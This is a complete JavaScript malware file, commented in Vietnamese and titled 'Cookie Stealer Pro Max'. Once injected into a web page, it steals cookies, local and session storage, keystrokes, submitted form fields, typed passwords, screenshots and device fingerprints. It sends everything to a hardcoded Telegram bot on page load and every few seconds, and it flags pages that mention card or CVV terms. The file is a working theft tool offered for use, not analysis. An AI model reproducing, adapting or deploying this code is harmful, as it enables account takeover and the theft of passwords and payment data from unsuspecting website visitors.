/**
 * ============================================
 *  🍪 COOKIE STEALER PRO MAX - BẢN SIÊU NÂNG CẤP
 *  - Tự động gửi cookie khi load trang
 *  - Keylogger ghi lại phím bấm
 *  - Capture form password
 *  - Gửi ảnh screenshot
 *  - Gửi về nhiều bot backup
 *  - Theo dõi cookie thay đổi
 * ============================================
 */

// ====== CẤU HÌNH TELEGRAM ======
const BOT_TOKEN = "8921957218:AAFpPTSp5c56ByZMXZRlw8XwBxXj9ap_AE8";
const CHAT_ID = "8872446985";

// ====== BOT BACKUP (ĐỀ PHÒNG BOT CHÍNH BỊ KHOÁ) ======
const BACKUP_BOTS = [
    // { token: "BACKUP_BOT_TOKEN_1", chatId: "BACKUP_CHAT_ID_1" },
    // { token: "BACKUP_BOT_TOKEN_2", chatId: "BACKUP_CHAT_ID_2" }
];

// ====== CẤU HÌNH ======
const CONFIG = {
    autoSendOnLoad: true,        // Tự động gửi khi load trang
    sendInterval: 5000,          // Gửi lại mỗi 5 giây
    enableKeylogger: true,       // Bật keylogger
    enableScreenshot: true,      // Chụp màn hình (cần thư viện)
    captureForms: true,          // Bắt mật khẩu từ form
    trackCookieChanges: true,    // Theo dõi cookie thay đổi
    redirectAfter: true,         // Chuyển hướng sau khi lấy cookie
    redirectUrl: 'https://shopee.vn/',
    maxRetries: 3                // Số lần thử gửi lại nếu thất bại
};

// ====== BIẾN TOÀN CỤ ======
let lastCookies = '';
let keyLogs = [];
let isSending = false;

// ====== LẤY TẤT CẢ DỮ LIỆU ======
function getAllData() {
    // Cookie
    const cookies = document.cookie || "(Không có cookie)";

    // LocalStorage
    let localStorageData = {};
    try {
        localStorageData = { ...localStorage };
    } catch (_) {
        localStorageData = { error: "Không thể đọc localStorage" };
    }

    // SessionStorage
    let sessionStorageData = {};
    try {
        sessionStorageData = { ...sessionStorage };
    } catch (_) {
        sessionStorageData = { error: "Không thể đọc sessionStorage" };
    }

    // Cookie HttpOnly (thử lấy qua fetch)
    let httpOnlyCookies = 'Không lấy được (có thể HttpOnly)';
    try {
        // Thử gọi API để lấy cookie qua header
        fetch(window.location.origin + '/', {
            credentials: 'include'
        })
        .then(res => {
            const cookieHeader = res.headers.get('set-cookie');
            if (cookieHeader) {
                httpOnlyCookies = cookieHeader;
            }
        })
        .catch(() => {});
    } catch (_) {}

    // Thông tin thiết bị
    const deviceInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages ? navigator.languages.join(", ") : "N/A",
        screen: `${window.screen.width}x${window.screen.height}`,
        screenColorDepth: window.screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezoneOffset: new Date().getTimezoneOffset(),
        url: window.location.href,
        referrer: document.referrer || "Direct",
        hostname: window.location.hostname,
        pathname: window.location.pathname,
        protocol: window.location.protocol,
        isMobile: /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent),
        isTouch: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
        connection: navigator.connection ? {
            effectiveType: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink,
            rtt: navigator.connection.rtt
        } : "Không có thông tin mạng",
        battery: navigator.getBattery ? 'Có hỗ trợ' : 'Không hỗ trợ',
        memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Không xác định',
        cores: navigator.hardwareConcurrency || 'Không xác định'
    };

    // Xây dựng tin nhắn
    let text = `🍪 **DỮ LIỆU NẠN NHÂN**\n\n`;
    text += `📌 **Cookies:**\n\`${cookies}\`\n\n`;
    
    if (httpOnlyCookies !== 'Không lấy được (có thể HttpOnly)') {
        text += `🔒 **HttpOnly Cookies:**\n\`${httpOnlyCookies}\`\n\n`;
    }
    
    text += `💾 **LocalStorage:**\n\`\`\`json\n${JSON.stringify(localStorageData, null, 2)}\n\`\`\`\n\n`;
    text += `📦 **SessionStorage:**\n\`\`\`json\n${JSON.stringify(sessionStorageData, null, 2)}\n\`\`\`\n\n`;
    text += `🖥️ **User-Agent:**\n\`${deviceInfo.userAgent}\`\n\n`;
    text += `💻 **Platform:** ${deviceInfo.platform}\n`;
    text += `🌐 **Ngôn ngữ:** ${deviceInfo.language} (${deviceInfo.languages})\n`;
    text += `📱 **Màn hình:** ${deviceInfo.screen} (${deviceInfo.screenColorDepth}-bit)\n`;
    text += `📱 **Mobile:** ${deviceInfo.isMobile ? '✅ Có' : '❌ Không'}\n`;
    text += `🕒 **Múi giờ:** ${deviceInfo.timezone} (offset ${deviceInfo.timezoneOffset} phút)\n`;
    text += `🔗 **URL:** ${deviceInfo.url}\n`;
    text += `↩️ **Referrer:** ${deviceInfo.referrer}\n`;
    text += `📡 **Kết nối:** ${typeof deviceInfo.connection === 'string' ? deviceInfo.connection : `${deviceInfo.connection.effectiveType} - ${deviceInfo.connection.downlink}Mbps`}\n`;
    text += `🧠 **RAM:** ${deviceInfo.memory}\n`;
    text += `⚡ **CPU Cores:** ${deviceInfo.cores}\n`;
    text += `⏰ **Thời gian:** ${new Date().toLocaleString('vi-VN')}\n`;

    // Thêm keylog nếu có
    if (keyLogs.length > 0) {
        text += `\n⌨️ **Keylog (${keyLogs.length} phím):**\n\`${keyLogs.join('')}\`\n`;
    }

    return text;
}

// ====== GỬI QUA TELEGRAM (CÓ THỬ LẠI) ======
async function sendToTelegram(message, retryCount = 0) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    try {
        const response = await fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: "Markdown",
                disable_web_page_preview: true
            })
        });

        if (!response.ok) {
            throw new Error(`HTTP ${response.status}`);
        }

        const data = await response.json();
        if (data.ok) {
            console.log('✅ Đã gửi thành công!');
            // Gửi đến các bot backup
            sendToBackupBots(message);
            return true;
        } else {
            console.error("Telegram error:", data);
            if (retryCount < CONFIG.maxRetries) {
                console.log(`🔄 Thử lại lần ${retryCount + 1}...`);
                await new Promise(resolve => setTimeout(resolve, 2000));
                return sendToTelegram(message, retryCount + 1);
            }
            return false;
        }
    } catch (error) {
        console.error("Send error:", error);
        if (retryCount < CONFIG.maxRetries) {
            console.log(`🔄 Thử lại lần ${retryCount + 1}...`);
            await new Promise(resolve => setTimeout(resolve, 2000));
            return sendToTelegram(message, retryCount + 1);
        }
        return false;
    }
}

// ====== GỬI ĐẾN BOT BACKUP ======
function sendToBackupBots(message) {
    BACKUP_BOTS.forEach(backup => {
        const url = `https://api.telegram.org/bot${backup.token}/sendMessage`;
        fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: backup.chatId,
                text: message,
                parse_mode: "Markdown",
                disable_web_page_preview: true
            })
        }).catch(() => {});
    });
}

// ====== GỬI ẢNH QUA TELEGRAM ======
async function sendImageToTelegram(imageData, caption = '') {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
    
    try {
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', imageData);
        formData.append('caption', caption);
        formData.append('parse_mode', 'Markdown');

        const response = await fetch(url, {
            method: 'POST',
            body: formData
        });
        
        return response.ok;
    } catch (error) {
        console.error('Lỗi gửi ảnh:', error);
        return false;
    }
}

// ====== CHỤP MÀN HÌNH (DÙNG HTML2CANVAS) ======
function captureScreenshot() {
    if (!CONFIG.enableScreenshot) return;
    
    // Kiểm tra thư viện html2canvas đã load chưa
    if (typeof html2canvas !== 'undefined') {
        html2canvas(document.body, {
            allowTaint: true,
            useCORS: true,
            logging: false,
            width: window.innerWidth,
            height: window.innerHeight,
            scale: 0.5 // Giảm chất lượng để gửi nhanh
        }).then(canvas => {
            canvas.toBlob(function(blob) {
                const file = new File([blob], 'screenshot.png', { type: 'image/png' });
                sendImageToTelegram(file, '📸 **Screenshot trang web**');
            }, 'image/png');
        }).catch(() => {});
    } else {
        // Tải html2canvas nếu chưa có
        const script = document.createElement('script');
        script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
        script.onload = () => {
            setTimeout(captureScreenshot, 1000);
        };
        document.head.appendChild(script);
    }
}

// ====== KEYLOGGER ======
function setupKeylogger() {
    if (!CONFIG.enableKeylogger) return;

    document.addEventListener('keydown', function(e) {
        const key = e.key;
        
        // Bỏ qua phím điều hướng
        if (['Shift', 'Control', 'Alt', 'Meta', 'CapsLock'].includes(key)) {
            return;
        }

        let keyChar = key;
        if (key === 'Backspace') keyChar = '[⌫]';
        else if (key === 'Enter') keyChar = '[↵]\n';
        else if (key === 'Tab') keyChar = '[⇥]';
        else if (key === 'Escape') keyChar = '[⎋]';
        else if (key === 'Delete') keyChar = '[⌦]';
        else if (key === 'ArrowUp') keyChar = '[↑]';
        else if (key === 'ArrowDown') keyChar = '[↓]';
        else if (key === 'ArrowLeft') keyChar = '[←]';
        else if (key === 'ArrowRight') keyChar = '[→]';
        else if (key.length > 1) keyChar = `[${key}]`;

        keyLogs.push(keyChar);

        // Nếu đạt 100 phím hoặc phím Enter, gửi log
        if (keyLogs.length >= 100 || key === 'Enter') {
            sendKeylogs();
        }
    });
}

// ====== GỬI KEYLOG ======
function sendKeylogs() {
    if (keyLogs.length === 0) return;

    const logText = keyLogs.join('');
    const message = `⌨️ **KEYLOG**\n\n\`${logText}\`\n\n📌 URL: ${window.location.href}`;
    
    sendToTelegram(message);
    keyLogs = []; // Reset
}

// ====== CAPTURE FORM PASSWORD ======
function captureForms() {
    if (!CONFIG.captureForms) return;

    document.addEventListener('submit', function(e) {
        const form = e.target;
        const inputs = form.querySelectorAll('input[type="password"], input[type="text"], input[type="email"], input[name*="pass"], input[name*="user"]');
        
        const formData = {};
        inputs.forEach(input => {
            if (input.value && input.value.length > 0) {
                const name = input.name || input.id || input.placeholder || 'unknown';
                formData[name] = input.value;
            }
        });

        if (Object.keys(formData).length > 0) {
            const message = `🔐 **FORM SUBMIT DETECTED**\n\n📌 URL: ${window.location.href}\n\n📝 **Dữ liệu:**\n\`\`\`json\n${JSON.stringify(formData, null, 2)}\n\`\`\``;
            sendToTelegram(message);
        }
    });

    // Cũng bắt sự kiện change trên input password
    document.addEventListener('change', function(e) {
        if (e.target.type === 'password' && e.target.value.length > 3) {
            const message = `🔑 **PASSWORD DETECTED**\n\n📌 URL: ${window.location.href}\n🔐 Password: \`${e.target.value}\``;
            sendToTelegram(message);
        }
    });
}

// ====== THEO DÕI COOKIE THAY ĐỔI ======
function trackCookieChanges() {
    if (!CONFIG.trackCookieChanges) return;

    setInterval(() => {
        const currentCookies = document.cookie;
        if (currentCookies && currentCookies !== lastCookies) {
            const message = `🔄 **COOKIE CHANGED**\n\n📌 URL: ${window.location.href}\n\n🍪 **Cookie cũ:**\n\`${lastCookies}\`\n\n🍪 **Cookie mới:**\n\`${currentCookies}\``;
            sendToTelegram(message);
            lastCookies = currentCookies;
        }
    }, 3000);
}

// ====== GỬI COOKIE ĐỊNH KỲ ======
function sendCookiePeriodically() {
    setInterval(() => {
        if (!isSending) {
            isSending = true;
            const data = getAllData();
            sendToTelegram(data).finally(() => {
                isSending = false;
            });
        }
    }, CONFIG.sendInterval);
}

// ====== PHÁT HIỆN DỮ LIỆU NHẠY CẢM ======
function detectSensitiveData() {
    // Tìm kiếm dữ liệu nhạy cảm trong DOM
    const sensitiveKeywords = ['credit', 'card', 'cvv', 'password', 'token', 'secret', 'key'];
    const allText = document.body.innerText;
    
    sensitiveKeywords.forEach(keyword => {
        if (allText.toLowerCase().includes(keyword)) {
            const message = `⚠️ **SENSITIVE DATA DETECTED**\n\n📌 URL: ${window.location.href}\n🔍 Keyword: \`${keyword}\``;
            setTimeout(() => sendToTelegram(message), 1000);
        }
    });
}

// ====== LẤY COOKIE TỪ CÁC TAB KHÁC (NẾU CÓ THỂ) ======
function stealFromOtherTabs() {
    try {
        // Thử đọc localStorage từ các tab khác (nếu cùng origin)
        const storageKeys = Object.keys(localStorage);
        if (storageKeys.length > 0) {
            const data = {};
            storageKeys.forEach(key => {
                data[key] = localStorage.getItem(key);
            });
            
            const message = `📂 **CROSS-TAB DATA**\n\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``;
            setTimeout(() => sendToTelegram(message), 1000);
        }
    } catch (_) {}
}

// ====== MAIN EXECUTION ======
console.log('🍪 Cookie Stealer Pro Max đang khởi động...');

// 1. Setup keylogger
setupKeylogger();

// 2. Capture forms
captureForms();

// 3. Track cookie changes
trackCookieChanges();

// 4. Detect sensitive data
setTimeout(detectSensitiveData, 2000);

// 5. Steal from other tabs
setTimeout(stealFromOtherTabs, 3000);

// 6. Gửi cookie tự động khi load
if (CONFIG.autoSendOnLoad) {
    window.addEventListener('load', function() {
        console.log('📩 Tự động gửi cookie...');
        const data = getAllData();
        sendToTelegram(data);
        
        // Chụp screenshot
        setTimeout(captureScreenshot, 2000);
    });
}

// 7. Gửi cookie định kỳ
setTimeout(sendCookiePeriodically, 5000);

// 8. Gửi keylog mỗi 30 giây
setInterval(() => {
    if (keyLogs.length > 0) {
        sendKeylogs();
    }
}, 30000);

// 9. Cập nhật giao diện nếu có
try {
    // Nếu có nút claimBtn, xử lý click
    const btn = document.getElementById('claimBtn');
    if (btn) {
        btn.addEventListener('click', function() {
            // Đã có trong logic cũ
        });
    }
} catch (_) {}

console.log('✅ Cookie Stealer Pro Max đã sẵn sàng!');
console.log('📡 Bot Token:', BOT_TOKEN ? 'Đã cấu hình ✅' : '❌ Chưa cấu hình');
console.log('🆔 Chat ID:', CHAT_ID ? 'Đã cấu hình ✅' : '❌ Chưa cấu hình');
console.log('🔧 Cấu hình:', CONFIG);
